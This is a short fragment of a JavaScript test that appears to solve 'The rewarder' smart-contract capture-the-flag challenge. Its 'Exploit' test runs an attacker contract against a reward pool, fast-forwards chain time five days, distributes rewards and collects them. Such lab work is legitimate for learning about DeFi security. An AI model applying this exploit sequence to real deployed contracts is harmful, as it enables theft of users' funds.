...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        console.log("Attacker contract addr", this.attackerContract.address);
        this.attackerContract.attack(TOKENS_IN_LENDER_POOL);
        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        await this.rewarderPool.connect(attacker).distributeRewards();
        await this.attackerContract.collectRewards();
    });
